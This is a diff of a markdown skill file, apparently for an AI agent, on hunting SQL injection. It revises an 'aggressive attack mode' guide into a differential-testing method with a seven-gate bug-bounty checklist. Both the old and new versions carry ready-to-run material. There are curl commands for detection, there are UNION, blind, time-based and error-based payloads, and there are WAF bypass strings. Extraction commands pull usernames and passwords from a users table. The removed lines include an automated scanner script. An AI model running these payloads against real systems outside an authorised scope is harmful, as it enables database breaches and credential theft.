@@ -1,32 +1,82 @@
 ---
 name: hunt-sqli
-description: SQL Injection hunting — Error-based, Blind, Union, Time-based. Generates ready-to-run payloads, WAF bypass techniques, and data extraction scripts. This skill produces executable attack code for finding and exploiting SQL injection vulnerabilities.
+description: SQL Injection hunting with differential testing — Error-based, Blind, Union, Time-based. WAF bypass techniques. Every candidate must demonstrate data extraction or impact. 7-gate validation mandatory.
 ---
 
-# SQL INJECTION HUNTING — AGGRESSIVE ATTACK MODE
+# SQL INJECTION HUNTING — DIFFERENTIAL TESTING METHOD
 
-**SQLi can go from error message to full database dump in minutes.**
+**SQLi is only a vulnerability if you can extract data or impact the database.**
 
-## Quick Start
+---
 
-```bash
-# Test for SQLi
-TARGET="https://example.com/search?q="
+## HYPOTHESIS GENERATION
 
-# Error-based
-curl -s "$TARGET'" | grep -i "error\|syntax\|mysql\|sql\|warning"
-
-# Union-based
-curl -s "$TARGET' UNION SELECT NULL--" 
-
-# Time-based
-curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
+```
+HYPOTHESIS: SQLi on [endpoint]
+  Endpoint: [METHOD] [URL with parameter]
+  Parameter: [param_name]
+  Precondition: [authenticated/unauthenticated]
+  Expected: Parameterized query
+  Attack: SQL syntax executes in database
+  Impact: Data extraction / modification / RCE
+  Confidence: [HIGH/MEDIUM/LOW]
 ```
 
-## Payload Arsenal
+---
+
+## DIFFERENTIAL TESTING METHOD
+
+### Core Principle
+
+> **The vulnerability is not that the server returns an error. The vulnerability is that SQL syntax injected by the attacker is interpreted by the database.**
+
+### Error-Based Differential
+
+```
+TEST MATRIX:
+  Normal input (1) → 200 with expected data
+  SQL syntax (1') → 200 with DIFFERENT data OR SQL error
+  Boolean true (1' AND 1=1--) → same as normal
+  Boolean false (1' AND 1=0--) → DIFFERENT from normal
+
+FINDING: If input changes SQL behavior → SQLi
+NOT A FINDING: If parameterized queries handle all inputs
+```
+
+### Implementation
+
+```bash
+TARGET="https://target.com/api/users?id="
+
+# Step 1: Baseline — normal input
+echo "=== BASELINE ==="
+curl -s "$TARGET"1 | python3 -m json.tool
+# EXPECTED: Normal user data
+
+# Step 2: Error trigger
+echo "=== ERROR TRIGGER ==="
+curl -s "$TARGET"1'" | head -20
+# EXPECTED: SQL error (syntax error, mysql error, etc.)
+# IF ERROR → SQLi possible
+
+# Step 3: Boolean differential
+echo "=== BOOLEAN TRUE ==="
+curl -s "$TARGET"1'+AND+1=1--" | python3 -m json.tool
+
+echo "=== BOOLEAN FALSE ==="
+curl -s "$TARGET"1'+AND+1=0--" | python3 -m json.tool
+
+# DIFFERENTIAL: If Boolean TRUE matches baseline but Boolean FALSE differs → SQLi CONFIRMED
+```
+
+---
+
+## PAYLOAD ARSENAL
 
 ### Detection
-```sql'
+
+```sql
+'
 ''
 `)
 '))
@@ -40,6 +90,7 @@ curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
 ```
 
 ### Union-Based
+
 ```sql
 ' UNION SELECT NULL--
 ' UNION SELECT NULL,NULL--
@@ -51,6 +102,7 @@ curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
 ```
 
 ### Blind SQLi (Time-based)
+
 ```sql
 -- MySQL
 ' AND SLEEP(5)--
@@ -59,7 +111,6 @@ curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
 
 -- PostgreSQL
 ' AND pg_sleep(5)--
-' AND (SELECT pg_sleep(5))--
 
 -- MSSQL
 '; WAITFOR DELAY '0:0:5'--
@@ -70,6 +121,7 @@ curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
 ```
 
 ### Error-based
+
 ```sql
 ' AND 1=CONVERT(int,@@version)--
 ' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))--
@@ -78,50 +130,18 @@ curl -s -o /dev/null -w "%{time_total}" "$TARGET' AND SLEEP(5)--"
 ```
 
 ### WAF Bypass
+
 ```sql
 /*!50000 SELECT*/ * FROM users    -- MySQL inline comment
 SE/**/LECT * FROM users            -- comment injection
 SeLeCt * FrOm uSeRs              -- case variation
 %27 OR %271%27=%271               -- URL encoding
 ʼ OR ʼ1ʼ=ʼ1                      -- Unicode apostrophe
-'/*!50000union*/+/*!50000select*/--  -- MySQL version comment
 ```
 
-## Automated SQLi Scanner
+---
 
-```bash
-#!/bin/bash
-TARGET=$1
-PARAM=$2
-
-echo "=== SQLi SCAN: $TARGET ==="
-
-# Error-based
-echo "--- Error-based ---"
-curl -s "$TARGET?$PARAM='" | grep -i "error\|syntax\|mysql\|sql\|warning\|exception" && echo "[+] Error-based SQLi possible"
-
-# Union-based
-echo "--- Union-based ---"
-for cols in 1 2 3 4 5; do
-  nulls=$(printf "NULL," | head -c $((cols * 5)))
-  nulls=${nulls%,}
-  response=$(curl -s "$TARGET?$PARAM=' UNION SELECT $nulls--")
-  if ! echo "$response" | grep -qi "error\|syntax"; then
-    echo "[+] Union-based SQLi possible with $cols columns"
-    break
-  fi
-done
-
-# Time-based
-echo "--- Time-based ---"
-time_before=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET?$PARAM=' AND SLEEP(3)--")
-time_after=$(curl -s -o /dev/null -w "%{time_total}" "$TARGET?$PARAM=' AND SLEEP(3)--")
-if (( $(echo "$time_after > $time_before + 2" | bc -l) )); then
-  echo "[+] Time-based SQLi confirmed"
-fi
-```
-
-## Data Extraction
+## DATA EXTRACTION
 
 ```bash
 # Extract database version
@@ -135,26 +155,51 @@ curl -s "$TARGET?' UNION SELECT column_name,NULL,NULL FROM information_schema.co
 
 # Extract user data
 curl -s "$TARGET?' UNION SELECT username,password,NULL FROM users--"
-
-# Extract all data
-curl -s "$TARGET?' UNION SELECT CONCAT(username,':',password),NULL,NULL FROM users--"
 ```
 
-## Escalation Paths
+---
 
-| SQLi Type | Impact | Severity |
-|-----------|--------|----------|
-| Error message only | Information disclosure | Low |
-| Data extraction (read) | Data breach | High |
-| Data modification (write) | Data manipulation | Critical |
-| INTO OUTFILE (web shell) | RCE | Critical |
-| Stored procedure execution | System commands | Critical |
+## GATE VALIDATION CHECKLIST
 
-## Checklist
+### Gate 1 — Scope
+- [ ] Affected endpoint is in scope
 
-- [ ] Error-based tested
-- [ ] Union-based tested (column count determined)
-- [ ] Blind SQLi (time-based) tested
-- [ ] WAF bypass techniques tested
-- [ ] Data extraction completed
-- [ ] Impact quantified ("extracted N records")
+### Gate 2 — Security Boundary
+- [ ] Database integrity/confidentiality violated
+- [ ] What data was extracted?
+
+### Gate 3 — Attacker Capability
+- [ ] Starting position documented
+
+### Gate 4 — Reproducibility
+- [ ] Exact request/response captured
+- [ ] SQL error or extracted data shown
+
+### Gate 5 — Impact
+- [ ] Select impact:
+  - Error message only → Low (info disclosure)
+  - Data extraction (read) → High (data breach)
+  - Data modification (write) → Critical (data manipulation)
+  - INTO OUTFILE → Critical (RCE)
+  - Stored procedure → Critical (system commands)
+
+### Gate 6 — False Positive Elimination
+- [ ] Error is SQL-specific (not generic application error)
+- [ ] Data actually extracted (not just error)
+- [ ] Not a WAF/CDN error page
+
+### Gate 7 — Program Acceptance
+- [ ] SQLi is in scope
+- [ ] Impact meets threshold
+
+---
+
+## ESCALATION PATHS
+
+```
+SQLi (error only) → Information disclosure → Low
+SQLi (data read) → Data breach → High
+SQLi (data write) → Data manipulation → Critical
+SQLi (INTO OUTFILE) → Web shell → RCE → Critical
+SQLi (stored procedures) → System commands → Critical
+```
